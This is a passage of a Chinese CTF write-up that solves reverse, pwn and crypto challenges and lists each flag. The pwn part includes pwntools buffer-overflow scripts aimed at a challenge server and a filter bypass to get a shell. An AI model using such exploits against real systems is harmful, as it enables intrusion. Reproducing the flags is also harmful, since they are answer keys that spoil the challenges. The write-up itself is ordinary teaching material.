class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">(<span class="title class_">String</span>[<span class="string">&#x27;prototype&#x27;</span>][<span class="string">&#x27;encrypt&#x27;</span>] = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> s = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">2</span>), key = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">4</span>);</span><br><span class="line">  <span class="keyword">let</span> res = <span class="string">&#x27;&#x27;</span>; plaintext = <span class="built_in">escape</span>(<span class="variable language_">this</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    key[i] = <span class="title class_">Str4ToLong</span>(str.<span class="title function_">slice</span>(i * <span class="number">4</span>, (i + <span class="number">1</span>) * <span class="number">4</span>)); <span class="comment">// 将密码表8位一组放入 key 中</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; plaintext.<span class="property">length</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">    s[<span class="number">0</span>] = <span class="title class_">Str4ToLong</span>(plaintext.<span class="title function_">slice</span>(i, i + <span class="number">4</span>));</span><br><span class="line">    s[<span class="number">1</span>] = <span class="title class_">Str4ToLong</span>(plaintext.<span class="title function_">slice</span>(i + <span class="number">4</span>, i + <span class="number">8</span>));</span><br><span class="line">    <span class="comment">// 8位一组中的前4位和后4位分别存入s[0]和s[1]中</span></span><br><span class="line">    <span class="title function_">code</span>(s, key);</span><br><span class="line">    res += <span class="title class_">LongToBase16</span>(s[<span class="number">0</span>]) + <span class="title class_">LongToBase16</span>(s[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">code</span>(<span class="params">s, key</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> delta = <span class="number">2654435769</span>;</span><br><span class="line">  <span class="keyword">let</span> v0 = s[<span class="number">0</span>], v1 = s[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[now &amp; <span class="number">3</span>]);</span><br><span class="line">    sum += delta;</span><br><span class="line">    v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[now &gt;&gt;&gt; <span class="number">11</span> &amp; <span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  s[<span class="number">0</span>] = v0, s[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Str4ToLong</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    res |= s.<span class="title function_">charCodeAt</span>(i) &lt;&lt; (i * <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">isNaN</span>(res) ? <span class="number">0</span> : res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">LongToBase16</span>(<span class="params">x</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = (x &gt;&gt; <span class="number">8</span> * i &amp; <span class="number">255</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">parseInt</span>(<span class="string">&#x27;0x&#x27;</span> + tmp) &lt;= <span class="number">15</span>) tmp = <span class="string">&#x27;0&#x27;</span> + tmp;</span><br><span class="line">    res += tmp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>了解逆向的同学或者擅长搜索或者数学比较好的同学会发现 code 函数里是一个可逆的加密算法（TEA）。</p>
+<p>密钥是 <code>1356853149054377</code>，密文是</p>
+<p> <code>b0838e1d4943a2ba6fbbc418378ef546a996a97a71ba42cf1a2d82a0ea2ca04bcc3ef521732552ff9b45f30a7a5ff421</code></p>
+<p>解密即可。</p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="0x1-babystack"><a href="#0x1-babystack" class="headerlink" title="0x1 babystack"></a>0x1 babystack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./babystack&#x27;)</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;47.113.202.106&#x27;</span>, <span class="number">1001</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x100</span> + <span class="number">8</span>) + p64(<span class="number">0x400746</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x2-just-rce"><a href="#0x2-just-rce" class="headerlink" title="0x2 just_rce"></a>0x2 just_rce</h2><p>题目可以执行一条system命令，但命令过滤了&#x2F;,f,l,a,g等字符，因此不能输入cat flag,&#x2F;bin&#x2F;sh等命令</p>
+<p>输入sh后get shell</p>
+<h2 id="0x3-easystack"><a href="#0x3-easystack" class="headerlink" title="0x3 easystack"></a>0x3 easystack</h2><p>题目开pie，随机地址后三位固定，爆破第四位，只输两字节，有1&#x2F;16概率成功，跑个10次左右能出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./easystack&#x27;)</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;47.113.202.106&#x27;</span>, <span class="number">1003</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *$rebase(0x1201)&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x100</span> + <span class="number">8</span>) + p16(<span class="number">0x1185</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;name&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>爆破是ctf很重要的思想，我们有时求的不是确定解，而是复杂度能够承受的不确定解。爆破能让ctf的思路大大开阔。</p>
+<p>有关PIE的介绍：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/11350476.html">https://www.cnblogs.com/ichunqiu/p/11350476.html</a></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Vigen"><a href="#Vigen" class="headerlink" title="Vigen"></a>Vigen</h2><p>Description:<br>There’s a key with the “crypto” engraved on it. What does that mean?</p>
+<p>flag:<br>njustCTF{Y0u_k0wn_7he_V1genere_c1pher!?}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">njustCTF&#123;You_kown_the_Vigenere_cipher!?&#125;</span><br><span class="line">-&gt; Vigenere cipher with key &quot;crypto&quot;</span><br><span class="line">pashmQVW&#123;W0j_d0kp_7yc_K1zspvpt_v1djvp!?&#125;</span><br></pre></td></tr></table></figure>
+
+<p>cipher:<br>pashmQVW{W0j_d0kp_7yc_K1zspvpt_v1djvp!?}</p>
+<h2 id="A-fence-called-caesar"><a href="#A-fence-called-caesar" class="headerlink" title="A-fence-called-caesar"></a>A-fence-called-caesar</h2><p>description:<br>A fence called caesar?</p>
+<p>flag:<br>njustCTF{caes4r_1s_1nt3r3st1ng_i5nt_it}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">njustCTF&#123;caes4r_1s_1nt3r3st1ng_i5nt_it&#125;</span><br><span class="line">-&gt; caesar +3</span><br><span class="line">qmxvwFWI&#123;fdhv4u_1v_1qw3u3vw1qj_l5qw_lw&#125;</span><br><span class="line">-&gt; fence 3</span><br><span class="line">qvWfv__w31_qlmwId4113vqlwwxF&#123;huvquwj5_&#125;</span><br></pre></td></tr></table></figure>
+
+<p>cipher:<br>qvWfv__w31_qlmwId4113vqlwwxF{huvquwj5_}</p>
+<h2 id="strange-text"><a href="#strange-text" class="headerlink" title="strange-text"></a>strange-text</h2><p>description:<br>We made a lot of substitutions to encrypt this. Can you decrypt it?</p>
+<p>flag:<br>njustCTF{frequency_is_c_over_lambda_ogfmaunraf}</p>
+<p>text:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">-</span><br><span class="line">congrats here is your flag - njustCTF&#123;frequency_is_c_over_lambda_ogfmaunraf&#125;</span><br><span class="line">-</span><br><span class="line">The Zen of Python, by Tim Peters</span><br><span class="line">Beautiful is better than ugly.</span><br><span class="line">Explicit is better than implicit.</span><br><span class="line">Simple is better than complex.</span><br><span class="line">Complex is better than complicated.</span><br><span class="line">Flat is better than nested.</span><br><span class="line">Sparse is better than dense.</span><br><span class="line">Readability counts.</span><br><span class="line">Special cases aren&#x27;t special enough to break the rules.</span><br><span class="line">Although practicality beats purity.</span><br><span class="line">Errors should never pass silently.</span><br><span class="line">Unless explicitly silenced.</span><br><span class="line">In the face of ambiguity, refuse the temptation to guess.</span><br><span class="line">There should be one-- and preferably only one --obvious way to do it.</span><br><span class="line">Although that way may not be obvious at first unless you&#x27;re Dutch.</span><br><span class="line">Now is better than never.</span><br><span class="line">Although never is often better than *right* now.</span><br><span class="line">If the implementation is hard to explain, it&#x27;s a bad idea.</span><br><span class="line">If the implementation is easy to explain, it may be a good idea.</span><br><span class="line">Namespaces are one honking great idea -- let&#x27;s do more of those!</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dict:</span><br><span class="line">&#123;&#x27;a&#x27;: &#x27;g&#x27;, &#x27;b&#x27;: &#x27;n&#x27;, &#x27;c&#x27;: &#x27;q&#x27;, &#x27;d&#x27;: &#x27;o&#x27;, &#x27;e&#x27;: &#x27;u&#x27;, &#x27;f&#x27;: &#x27;k&#x27;, &#x27;g&#x27;: &#x27;d&#x27;, &#x27;h&#x27;: &#x27;j&#x27;, &#x27;i&#x27;: &#x27;p&#x27;, &#x27;j&#x27;: &#x27;b&#x27;, &#x27;k&#x27;: &#x27;z&#x27;, &#x27;l&#x27;: &#x27;i&#x27;, &#x27;m&#x27;: &#x27;s&#x27;, &#x27;n&#x27;: &#x27;f&#x27;, &#x27;o&#x27;: &#x27;e&#x27;, &#x27;p&#x27;: &#x27;l&#x27;, &#x27;q&#x27;: &#x27;m&#x27;, &#x27;r&#x27;: &#x27;c&#x27;, &#x27;s&#x27;: &#x27;y&#x27;, &#x27;t&#x27;: &#x27;t&#x27;, &#x27;u&#x27;: &#x27;x&#x27;, &#x27;v&#x27;: &#x27;h&#x27;, &#x27;w&#x27;: &#x27;w&#x27;, &#x27;x&#x27;: &#x27;a&#x27;, &#x27;y&#x27;: &#x27;r&#x27;, &#x27;z&#x27;: &#x27;v&#x27;, &#x27;A&#x27;: &#x27;G&#x27;, &#x27;B&#x27;: &#x27;N&#x27;, &#x27;C&#x27;: </span><br><span class="line">&#x27;Q&#x27;, &#x27;D&#x27;: &#x27;O&#x27;, &#x27;E&#x27;: &#x27;U&#x27;, &#x27;F&#x27;: &#x27;K&#x27;, &#x27;G&#x27;: &#x27;D&#x27;, &#x27;H&#x27;: &#x27;J&#x27;, &#x27;I&#x27;: &#x27;P&#x27;, &#x27;J&#x27;: &#x27;B&#x27;, &#x27;K&#x27;: &#x27;Z&#x27;, &#x27;L&#x27;: &#x27;I&#x27;, &#x27;M&#x27;: &#x27;S&#x27;, &#x27;N&#x27;: &#x27;F&#x27;, &#x27;O&#x27;: &#x27;E&#x27;, &#x27;P&#x27;: &#x27;L&#x27;, &#x27;Q&#x27;: &#x27;M&#x27;, &#x27;R&#x27;: &#x27;C&#x27;, &#x27;S&#x27;: &#x27;Y&#x27;, &#x27;T&#x27;: &#x27;T&#x27;, &#x27;U&#x27;: &#x27;X&#x27;, &#x27;V&#x27;: &#x27;H&#x27;, &#x27;W&#x27;: &#x27;W&#x27;, &#x27;X&#x27;: &#x27;A&#x27;, &#x27;Y&#x27;: &#x27;R&#x27;, &#x27;Z&#x27;: &#x27;V&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cipher:</span><br><span class="line">-</span><br><span class="line">tvpaymze oiyi ke uvby qhma - pjbezTZQ&#123;qyisbiptu_ke_t_vxiy_hmwdrm_vaqwmbpymq&#125;</span><br><span class="line">-</span><br><span class="line">Zoi Fip vq Guzovp, du Zkw Giziye</span><br><span class="line">Dimbzkqbh ke dizziy zomp bahu.</span><br><span class="line">Icghktkz ke dizziy zomp kwghktkz.</span><br><span class="line">Ekwghi ke dizziy zomp tvwghic.</span><br><span class="line">Tvwghic ke dizziy zomp tvwghktmzir.</span><br><span class="line">Qhmz ke dizziy zomp piezir.</span><br><span class="line">Egmyei ke dizziy zomp ripei.</span><br><span class="line">Yimrmdkhkzu tvbpze.</span><br><span class="line">Egitkmh tmeie myip&#x27;z egitkmh ipvbao zv dyiml zoi ybhie.</span><br><span class="line">Mhzovbao gymtzktmhkzu dimze gbykzu.</span><br><span class="line">Iyyvye eovbhr pixiy gmee ekhipzhu.</span><br><span class="line">Bphiee icghktkzhu ekhiptir.</span><br><span class="line">Kp zoi qmti vq mwdkabkzu, yiqbei zoi ziwgzmzkvp zv abiee.</span><br><span class="line">Zoiyi eovbhr di vpi-- mpr gyiqiymdhu vphu vpi --vdxkvbe nmu zv rv kz.</span><br><span class="line">Mhzovbao zomz nmu wmu pvz di vdxkvbe mz qkyez bphiee uvb&#x27;yi Rbzto.</span><br><span class="line">Pvn ke dizziy zomp pixiy.</span><br><span class="line">Mhzovbao pixiy ke vqzip dizziy zomp *ykaoz* pvn.</span><br><span class="line">Kq zoi kwghiwipzmzkvp ke omyr zv icghmkp, kz&#x27;e m dmr krim.</span><br><span class="line">Kq zoi kwghiwipzmzkvp ke imeu zv icghmkp, kz wmu di m avvr krim.</span><br><span class="line">Pmwiegmtie myi vpi ovplkpa ayimz krim -- hiz&#x27;e rv wvyi vq zovei!</span><br></pre></td></tr></table></figure>
+
+<p>可以自己慢慢猜，比如根据 flag 结构和常见单词推断。<br>或者网站一把梭 <a target="_blank" rel="noopener" href="https://www.quipqiup.com/">https://www.quipqiup.com/</a></p>
+<h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>description:<br>Test your RSA :)</p>
+<p>flag:<br>njustCTF{Lo0k5_l1ke_y0u’ve_m4st3red_RSA!}</p>
+<p>attach file:</p>
+<p>encrypt.py</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime, invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">c</span>):</span><br><span class="line">    p = getPrime(<span class="number">12</span>)</span><br><span class="line">    q = getPrime(<span class="number">12</span>)</span><br><span class="line">    e = randint(<span class="number">0</span>, p * q)</span><br><span class="line">    <span class="keyword">while</span> gcd(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>)) != <span class="number">1</span>:</span><br><span class="line">        e = <span class="built_in">int</span>(next_prime(e))</span><br><span class="line">    <span class="keyword">return</span> e, p, q, <span class="built_in">pow</span>(<span class="built_in">ord</span>(c), e, p * q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(encrypt, flag)))</span><br><span class="line">    <span class="comment"># [(1472399, 3613, 2251, 6280474), (2026219, 3449, 2113, 2485104), (4308475, 2617, 3607, 7873880), (3333509, 2129, 4021, 3267716), (3432503, 4091, 3491, 10650760), (393697, 2699, 2063, 2609784), (95947, 3061, 3109, 1639087), (1201939, 3163, 3119, 9615544), (588807, 3491, 2531, 1544733), (3730171, 2129, 3449, 87178), (5216381, 2531, 2437, 78075), (1088419, 2207, 2179, 927132), (5354341, 3119, 2347, 771336), (4981303, 2309, 2371, 2467675), (3638045, 2999, 2879, 446617), (3812011, 2939, 2153, 1720392), (3950769, 2819, 2687, 1740581), (8494319, 3659, 2617, 1063611), (367237, 2729, 2417, 2079402), (8465207, 4073, 2851, 6846334), (4562271, 3191, 3779, 8462306), (8553713, 3433, 2609, 3850843), (7055989, 2671, 4051, 4928714), (1421731, 2203, 3329, 3517609), (74499, 2729, 2609, 3089008), (7735457, 3719, 2203, 4238105), (6622373, 3167, 2579, 3045437), (1941827, 2087, 3989, 6217255), (2203133, 3137, 2437, 6726509), (5532019, 3631, 2161, 4819002), (1928975, 2879, 3019, 6272684), (8919737, 3079, 3761, 11464481), (1283017, 3041, 3499, 9116694), (2573653, 2801, 2819, 3894494), (1414573, 2383, 2113, 2158302), (6092329, 2753, 2503, 2504631), (2480171, 2339, 2179, 241626), (94201, 2693, 3863, 6210827), (7323137, 3727, 3229, 2577321), (9328997, 3517, 2687, 3913005), (7944949, 4001, 3181, 11206040)]</span></span><br></pre></td></tr></table></figure>
+
+<p>decrypt</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime, invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="comment"># getPrime Return a random N-bit prime number.</span></span><br><span class="line">    p = getPrime(<span class="number">12</span>)</span><br><span class="line">    q = getPrime(<span class="number">12</span>)</span><br><span class="line">    <span class="comment"># randint Return random integer in range [a, b], including both end points.</span></span><br><span class="line">    e = randint(<span class="number">0</span>, p * q)</span><br><span class="line">    <span class="keyword">while</span> gcd(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>)) != <span class="number">1</span>:</span><br><span class="line">        e = <span class="built_in">int</span>(next_prime(e))</span><br><span class="line">    <span class="keyword">return</span> e, p, q, <span class="built_in">pow</span>(<span class="built_in">ord</span>(c), e, p * q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">a</span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">    e, p, q, en_flag = a</span><br><span class="line">    res = <span class="built_in">pow</span>(en_flag, <span class="built_in">int</span>(invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))), p * q)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># print(list(map(encrypt, flag)))</span></span><br><span class="line"></span><br><span class="line">    en_flag = [(<span class="number">1472399</span>, <span class="number">3613</span>, <span class="number">2251</span>, <span class="number">6280474</span>), (<span class="number">2026219</span>, <span class="number">3449</span>, <span class="number">2113</span>, <span class="number">2485104</span>), (<span class="number">4308475</span>, <span class="number">2617</span>, <span class="number">3607</span>, <span class="number">7873880</span>), (<span class="number">3333509</span>, <span class="number">2129</span>, <span class="number">4021</span>, <span class="number">3267716</span>), (<span class="number">3432503</span>, <span class="number">4091</span>, <span class="number">3491</span>, <span class="number">10650760</span>), (<span class="number">393697</span>, <span class="number">2699</span>, <span class="number">2063</span>, <span class="number">2609784</span>), (<span class="number">95947</span>, <span class="number">3061</span>, <span class="number">3109</span>, <span class="number">1639087</span>), (<span class="number">1201939</span>, <span class="number">3163</span>, <span class="number">3119</span>, <span class="number">9615544</span>), (<span class="number">588807</span>, <span class="number">3491</span>, <span class="number">2531</span>, <span class="number">1544733</span>), (<span class="number">3730171</span>, <span class="number">2129</span>, <span class="number">3449</span>, <span class="number">87178</span>), (<span class="number">5216381</span>, <span class="number">2531</span>, <span class="number">2437</span>, <span class="number">78075</span>), (<span class="number">1088419</span>, <span class="number">2207</span>, <span class="number">2179</span>, <span class="number">927132</span>), (<span class="number">5354341</span>, <span class="number">3119</span>, <span class="number">2347</span>, <span class="number">771336</span>), (<span class="number">4981303</span>, <span class="number">2309</span>, <span class="number">2371</span>, <span class="number">2467675</span>), (<span class="number">3638045</span>, <span class="number">2999</span>, <span class="number">2879</span>, <span class="number">446617</span>), (<span class="number">3812011</span>, <span class="number">2939</span>, <span class="number">2153</span>, <span class="number">1720392</span>), (<span class="number">3950769</span>, <span class="number">2819</span>, <span class="number">2687</span>, <span class="number">1740581</span>), (<span class="number">8494319</span>, <span class="number">3659</span>, <span class="number">2617</span>, <span class="number">1063611</span>), (<span class="number">367237</span>, <span class="number">2729</span>, <span class="number">2417</span>, <span class="number">2079402</span>), (<span class="number">8465207</span>, <span class="number">4073</span>, <span class="number">2851</span>, <span class="number">6846334</span>), (<span class="number">4562271</span>, <span class="number">3191</span>, <span class="number">3779</span>, <span class="number">8462306</span>), (<span class="number">8553713</span>, <span class="number">3433</span>, <span class="number">2609</span>, <span class="number">3850843</span>), (<span class="number">7055989</span>, <span class="number">2671</span>, <span class="number">4051</span>, <span class="number">4928714</span>), (<span class="number">1421731</span>, <span class="number">2203</span>, <span class="number">3329</span>, <span class="number">3517609</span>), (<span class="number">74499</span>, <span class="number">2729</span>, <span class="number">2609</span>, <span class="number">3089008</span>), (<span class="number">7735457</span>, <span class="number">3719</span>, <span class="number">2203</span>, <span class="number">4238105</span>), (<span class="number">6622373</span>, <span class="number">3167</span>, <span class="number">2579</span>, <span class="number">3045437</span>), (<span class="number">1941827</span>, <span class="number">2087</span>, <span class="number">3989</span>, <span class="number">6217255</span>), (<span class="number">2203133</span>, <span class="number">3137</span>, <span class="number">2437</span>, <span class="number">6726509</span>), (<span class="number">5532019</span>, <span class="number">3631</span>, <span class="number">2161</span>, <span class="number">4819002</span>), (<span class="number">1928975</span>, <span class="number">2879</span>, <span class="number">3019</span>, <span class="number">6272684</span>), (<span class="number">8919737</span>, <span class="number">3079</span>, <span class="number">3761</span>, <span class="number">11464481</span>), (<span class="number">1283017</span>, <span class="number">3041</span>, <span class="number">3499</span>, <span class="number">9116694</span>), (<span class="number">2573653</span>, <span class="number">2801</span>, <span class="number">2819</span>, <span class="number">3894494</span>), (<span class="number">1414573</span>, <span class="number">2383</span>, <span class="number">2113</span>, <span class="number">2158302</span>), (<span class="number">6092329</span>, <span class="number">2753</span>, <span class="number">2503</span>, <span class="number">2504631</span>), (<span class="number">2480171</span>, <span class="number">2339</span>, <span class="number">2179</span>, <span class="number">241626</span>), (<span class="number">94201</span>, <span class="number">2693</span>, <span class="number">3863</span>, <span class="number">6210827</span>), (<span class="number">7323137</span>, <span class="number">3727</span>, <span class="number">3229</span>, <span class="number">2577321</span>), (<span class="number">9328997</span>, <span class="number">3517</span>, <span class="number">2687</span>, <span class="number">3913005</span>), (<span class="number">7944949</span>, <span class="number">4001</span>, <span class="number">3181</span>, <span class="number">11206040</span>)]</span><br><span class="line">    <span class="comment"># en_flag = list(map(encrypt, flag))</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(decrypt, en_flag)))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p>纯 RSA 解密</p>
+<h2 id="hardRSA"><a href="#hardRSA" class="headerlink" title="hardRSA"></a>hardRSA</h2><p>description:<br>Oh my God, is this really RSA??</p>
+<p>flag:<br>njustCTF{Incredibly_proficient_in_cryptography!}</p>
+<p>encrypt</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">    p = <span class="number">1801</span> * random.getrandbits(<span class="number">1024</span>) + <span 